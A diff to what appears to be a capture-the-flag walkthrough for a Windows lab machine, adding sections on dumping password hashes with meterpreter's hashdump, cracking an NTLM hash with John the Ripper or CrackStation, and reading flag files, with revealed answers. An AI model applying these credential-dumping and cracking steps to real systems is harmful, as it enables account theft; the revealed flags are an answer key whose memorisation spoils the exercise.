@@ -203,7 +203,7 @@ To get in the meterpreter session use the command `sessions <SESSION_ID>`. Now r
 
 Now run the `ps` command to list all the running processes on the traget machine.
 
-![Running processes on target machine](/static/images/exploit-ps.png)
+![Running processes on target machine](/static/images/ps-blue.png)
 
 Migrate a process that is running under `NT AUTHORITY\SYSTEM` with the command `migrate [pid]`. It case it fails, chose another process id.
 
@@ -212,3 +212,75 @@ Migrate a process that is running under `NT AUTHORITY\SYSTEM` with the command `
     [*] Migration completed successfully.
 
 ### Cracking
+
+**Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**
+
+Run the `hashdump` command within the meterpreter session.
+
+    meterpreter > hashdump
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+==- Reveal Answer
+Jon
+===
+
+**Copy this password hash to a file and research how to crack it. What is the cracked password?**
+
+Copy the hash `ffb43f0de35be4d9917ac0cc8ad57f8d` into [CrackStation](https://crackstation.net/) to reveal the password, or use John the Ripper: `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt password.txt`. Create a text-file with the hash.
+
+==- Reveal Answer
+alqfna22
+===
+
+### Find Flags!
+
+Background the meterpreter session with command `background` and start the shell session with command `sessions <SESSION_ID>`.
+
+**Flag1? This flag can be found at the system root.**
+
+Change directory to `C:\` and run the `dir` command.
+
+    C:\Windows\system32>cd C:\
+    cd C:\
+
+    C:\>dir
+    dir
+    Volume in drive C has no label.
+    Volume Serial Number is E611-0B66
+
+    Directory of C:\
+
+    03/17/2019  02:27 PM                24 flag1.txt
+    07/13/2009  10:20 PM    <DIR>          PerfLogs
+    04/12/2011  03:28 AM    <DIR>          Program Files
+    03/17/2019  05:28 PM    <DIR>          Program Files (x86)
+    12/12/2018  10:13 PM    <DIR>          Users
+    03/17/2019  05:36 PM    <DIR>          Windows
+                1 File(s)             24 bytes
+                5 Dir(s)  20,369,653,760 bytes free
+
+Use the command `type flag1.txt` to print the content of the file to your terminal.
+
+==- Reveal Flag 1
+flag{access_the_machine}
+===
+
+**Flag2? This flag can be found at the location where passwords are stored within Windows.**
+
+The command `dir *flag*.* /s` will reveal the location of where the flags are stored.
+
+`type C:\Windows\System32\config\flag2.txt`
+
+==- Reveal Flag 2
+flag{sam_database_elevated_access}
+===
+
+**Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.**
+
+`type C:\Users\Jon\Documents\flag3.txt`
+
+==- Reveal Flag 3
+flag{admin_documents_can_be_valuable}
+===
